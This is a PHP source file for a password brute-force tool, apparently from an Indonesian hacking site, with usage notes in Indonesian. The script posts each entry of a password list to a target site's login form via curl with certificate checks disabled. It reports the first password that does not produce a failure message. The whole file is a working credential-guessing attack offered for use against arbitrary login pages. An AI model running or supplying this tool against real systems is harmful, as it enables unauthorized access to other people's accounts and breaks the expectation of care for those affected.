<?php
/*
by Tu5b0l3d
http://www.indoxploit.or.id/2016/06/tool-bruteforce-fleksibel.html

#################################################################################

Usage: php brute.php password.txt "username=admin&password=PASS::fail" url

PASS jangan diganti!

password.txt
password_1<br>password_2<br>password_3

fail adalah parameter yang menandakan gagal login, misalnya pas lu klik login
ada tulisan password atau username salah, berarti fail lu bisa ganti jadi salah

url ganti jadi url action loginnya.

##################################################################################

example:
php brute.php Pass.txt "usernm=admin&pss=PASS::salah" http://site.com/login_act.php

*/


if(is_file($argv[1]) && $argv[2]!="" && $argv[3]!=""){
$list = $argv[1];
$post_name_before = $argv[2];
$url = $argv[3];
$get_list = file_get_contents("$list");
$cok = explode("<br>", $get_list);

$param_failed = explode("::", $post_name_before);

foreach($cok as $pass){
$post_name = str_replace("PASS", $pass, $param_failed[0]);
 echo "\n$post_name\n";
$kirim = kirim($url, $post_name);
if(preg_match("/$param_failed[1]/i", $kirim)){
	echo "$pass <= No\n\n";
}
else{
	echo "$pass <====================== Yes\n\n";
	break;
}
}
}
else{
	echo "\n\nUsage: php $argv[0] password.txt \"username=admin&password=PASS:fail\" url\n# PASS jangan diganti\n\n# password.txt\npassword_1<br>password_2<br>password_3\n\n# fail adalah parameter yang menandakan gagal login, misalnya pas lu klik login ada tulisan password atau username salah, berarti fail lu bisa ganti jadi salah\n\n# url ganti jadi url action loginnya\n\nexample:\nphp brute.php Pass.txt \"usernm=admin&pss=PASS::salah\" http://site.com/login_act.php\n\n";
}

function kirim($url, $isi){
	$ch = curl_init ("$url");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, "$isi");
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$masuk = curl_exec ($ch);
return $masuk;
}

?>
